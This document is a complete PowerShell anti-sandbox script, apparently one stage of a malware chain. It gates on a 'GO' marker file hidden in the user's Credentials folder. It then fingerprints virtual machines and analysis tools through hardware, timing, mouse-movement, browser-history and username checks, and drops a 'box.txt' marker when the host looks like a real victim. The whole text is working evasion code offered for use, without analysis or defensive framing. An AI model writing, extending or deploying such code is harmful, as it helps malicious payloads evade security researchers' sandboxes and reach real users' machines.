# sandbox.ps1 - Advanced Anti-Sandbox Detection (2026)
# Multi-layered: hardware fingerprint, time distortion, human behavior, environment

$ErrorActionPreference = 'SilentlyContinue'
$powerPath = "$env:APPDATA\Microsoft\Credentials\power.txt"
$boxPath = "$env:APPDATA\Microsoft\Credentials\box.txt"
$sandboxScore = 0

# ============================================================
# GATE: Read power.txt, check GO
# ============================================================
$locations = @($powerPath, "$env:USERPROFILE\Desktop\power.txt", "$env:TEMP\power.txt")
$found = $false

foreach ($loc in $locations) {
    if (Test-Path $loc) {
        $content = [System.IO.File]::ReadAllText($loc, [System.Text.Encoding]::UTF8)
        if ($content -match "GO") {
            $found = $true
            break
        }
    }
}

if (-not $found) { exit }

# ============================================================
# LAYER 1: Advanced Hardware Fingerprinting
# ============================================================

# 1A: VM Hypervisor Artifacts
$vmIndicators = @("VMware","VirtualBox","VBox","Hyper-V","QEMU","Xen","Parallels","Sandboxie","Cuckoo","JoeBox","Virtual HD","Microsoft Hyper-V","Xen Virtual")
$model = (Get-WmiObject Win32_ComputerSystem).Model
$manufacturer = (Get-WmiObject Win32_ComputerSystem).Manufacturer
foreach ($ind in $vmIndicators) {
    if ($model -match $ind) { $sandboxScore += 30 }
    if ($manufacturer -match $ind) { $sandboxScore += 30 }
    if ($env:PROCESSOR_IDENTIFIER -match $ind) { $sandboxScore += 30 }
}

# 1B: MAC Address OUI Check
$macs = (Get-NetAdapter | Where-Object {$_.Status -eq "Up"}).MacAddress
$vmMACs = @("00:0C:29","00:50:56","08:00:27","00:03:FF","00:1C:42","00:16:3E","00:15:5D","00:05:69","0A:00:27")
foreach ($mac in $macs) {
    foreach ($v in $vmMACs) {
        if ($mac -match $v) { $sandboxScore += 25 }
    }
}

# 1C: Thermal Zone Verification (VMs return 0 or error)
try {
    $thermal = Get-CimInstance -Namespace "root/WMI" -ClassName MSAcpi_ThermalZoneTemperature -ErrorAction Stop
    $realThermal = $thermal | Where-Object { $_.CurrentTemperature -gt 0 -and $_.CurrentTemperature -lt 5000 }
    if ($realThermal.Count -eq 0) { $sandboxScore += 15 }
} catch {
    $sandboxScore += 15
}

# 1D: Processor Topology (sandboxes use 1-2 cores)
$cpuCores = (Get-CimInstance Win32_Processor).NumberOfCores
if ($cpuCores -lt 4) { $sandboxScore += 15 }

# 1E: USB/Peripheral History (VMs have empty USBSTOR)
try {
    $usbDevices = Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Enum\USBSTOR\*" -ErrorAction Stop
    $usbCount = ($usbDevices | Measure-Object).Count
    if ($usbCount -lt 2) { $sandboxScore += 10 }
} catch {
    $sandboxScore += 10
}

# 1F: Storage History (OEM NVMe serial logs, partitions)
try {
    $disk = Get-PhysicalDisk | Select-Object -First 1
    if ($disk.FriendlyName -match "Virtual|QEMU|VBOX|VMware") { $sandboxScore += 20 }
    $partitions = (Get-Partition | Where-Object {$_.DriveLetter -eq "C"}).PartitionNumber
    if ($partitions -lt 1) { $sandboxScore += 5 }
} catch {}

# 1G: BIOS/UEFI Artifacts
try {
    $bios = Get-WmiObject Win32_BIOS
    if ($bios.Manufacturer -match "VMware|VirtualBox|Xen|QEMU|Parallels") { $sandboxScore += 25 }
    if ($bios.SerialNumber -match "VMware|VBOX|00000") { $sandboxScore += 20 }
} catch {}

# 1H: GPU Detection (VMs lack real GPU)
try {
    $gpu = Get-CimInstance Win32_VideoController | Select-Object -First 1
    if ($gpu.Name -match "SVGA|Virtual|Basic|Microsoft|VMware") { $sandboxScore += 15 }
    if ($gpu.AdapterRAM -lt 1GB) { $sandboxScore += 10 }
} catch {}

# ============================================================
# LAYER 2: Time-Distortion Detection
# ============================================================

# 2A: Mathematical Timing Loop (RDTSC equivalent)
$stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
$iterations = 1000000
$result = 0
for ($i = 0; $i -lt $iterations; $i++) {
    $result += [Math]::Sqrt($i) * [Math]::Sin($i)
}
$stopwatch.Stop()
$elapsedMs = $stopwatch.ElapsedMilliseconds

# Real system: ~500-2000ms for 1M iterations
# Fast-forwarded sandbox: <100ms or >10000ms
if ($elapsedMs -lt 100) { $sandboxScore += 25 }
if ($elapsedMs -gt 10000) { $sandboxScore += 15 }

# 2B: External Time Anchor (NTP query)
try {
    $ntpStart = Get-Date
    $ntp1 = Invoke-RestMethod -Uri "https://worldtimeapi.org/api/timezone/Etc/UTC" -TimeoutSec 3
    $ntpEnd = Get-Date
    $networkMs = ($ntpEnd - $ntpStart).TotalMilliseconds
    
    if ($ntp1 -and $ntp1.unixtime) {
        $externalTime = [DateTimeOffset]::FromUnixTimeSeconds($ntp1.unixtime).DateTime
        $diff = [Math]::Abs(((Get-Date) - $externalTime).TotalSeconds)
        if ($diff -gt 300) { $sandboxScore += 20 }
    }
} catch {}

# 2C: Sleep Verification (anti-acceleration)
$sleepStart = Get-Date
Start-Sleep -Milliseconds 3000
$sleepEnd = Get-Date
$sleepActual = ($sleepEnd - $sleepStart).TotalMilliseconds
if ($sleepActual -lt 2500) { $sandboxScore += 20 }

# ============================================================
# LAYER 3: Human Behavior Verification
# ============================================================

# 3A: Mouse Movement Analysis (requires Add-Type for Win32)
try {
    Add-Type -TypeDefinition @"
    using System;
    using System.Runtime.InteropServices;
    public class InputCheck {
        [DllImport("user32.dll")]
        public static extern bool GetCursorPos(out POINT lpPoint);
        [StructLayout(LayoutKind.Sequential)]
        public struct POINT { public int X; public int Y; }
    }
"@ -ErrorAction SilentlyContinue

    $points = @()
    for ($i = 0; $i -lt 10; $i++) {
        $pt = New-Object InputCheck+POINT
        [InputCheck]::GetCursorPos([ref]$pt) | Out-Null
        $points += "$($pt.X),$($pt.Y)"
        Start-Sleep -Milliseconds 500
    }

    # Check for straight-line movement (sandbox automation)
    $uniquePoints = $points | Select-Object -Unique
    if ($uniquePoints.Count -lt 5) { $sandboxScore += 15 }
} catch {}

# 3B: Browser History Depth (real users have history)
$browserPaths = @(
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History",
    "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"
)
$totalHistory = 0
foreach ($bp in $browserPaths) {
    $expanded = Invoke-Expression "Get-ChildItem '$bp' -ErrorAction SilentlyContinue"
    foreach ($f in $expanded) {
        if ($f.Length -gt 100000) { $totalHistory += $f.Length }
    }
}
if ($totalHistory -lt 500000) { $sandboxScore += 10 }

# 3C: Recent Files Artifact Scan
$recentPaths = @(
    "$env:APPDATA\Microsoft\Windows\Recent",
    "$env:LOCALAPPDATA\Temp"
)
$totalRecent = 0
foreach ($rp in $recentPaths) {
    $count = (Get-ChildItem $rp -ErrorAction SilentlyContinue | Measure-Object).Count
    $totalRecent += $count
}
if ($totalRecent -lt 20) { $sandboxScore += 15 }

# 3D: Desktop File Count
$desktopCount = (Get-ChildItem "$env:USERPROFILE\Desktop" -ErrorAction SilentlyContinue | Measure-Object).Count
if ($desktopCount -lt 3) { $sandboxScore += 10 }

# ============================================================
# LAYER 4: Environment Fingerprinting
# ============================================================

# 4A: Disk Size
$diskSize = (Get-WmiObject Win32_LogicalDisk -Filter "DeviceID='C:'").Size
if ($diskSize -lt 80GB) { $sandboxScore += 10 }

# 4B: RAM
$ram = (Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory
if ($ram -lt 2GB) { $sandboxScore += 15 }

# 4C: Username
$suspiciousUsers = @("sandbox","malware","virus","test","maltest","john","wine","cuckoo","virustotal","admin","user","computer")
foreach ($u in $suspiciousUsers) {
    if ($env:USERNAME -match $u) { $sandboxScore += 15 }
}

# 4D: Uptime
$uptime = (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
$mins = ((Get-Date) - $uptime).TotalMinutes
if ($mins -lt 5) { $sandboxScore += 20 }

# 4E: Installed Software Count (sandboxes have few apps)
try {
    $apps = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" -ErrorAction Stop
    $appCount = ($apps | Where-Object { $_.DisplayName } | Measure-Object).Count
    if ($appCount -lt 10) { $sandboxScore += 15 }
} catch {}

# 4F: Windows Updates History
try {
    $updates = Get-HotFix -ErrorAction Stop
    if ($updates.Count -lt 5) { $sandboxScore += 10 }
} catch {}

# 4G: Network Adapters (VMs have minimal)
$netAdapters = (Get-NetAdapter | Where-Object {$_.Status -eq "Up"} | Measure-Object).Count
if ($netAdapters -lt 1) { $sandboxScore += 10 }

# ============================================================
# DECISION: Score Threshold
# ============================================================
# Score ranges:
# 0-25: Likely real system
# 26-50: Suspicious, could be hardened VM
# 51+: Definitely sandbox/VM

$sandboxDetected = $sandboxScore -ge 50

# ============================================================
# OUTPUT: Drop box.txt if clean
# ============================================================
if (-not $sandboxDetected) {
    $boxText = "CLEAN`nSCORE:$sandboxScore`nGO"
    try {
        $dir = Split-Path $boxPath -Parent
        if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
        [System.IO.File]::WriteAllText($boxPath, $boxText, [System.Text.Encoding]::UTF8)
    } catch {
        $boxPath = "$env:USERPROFILE\Desktop\box.txt"
        [System.IO.File]::WriteAllText($boxPath, $boxText, [System.Text.Encoding]::UTF8)
    }
}
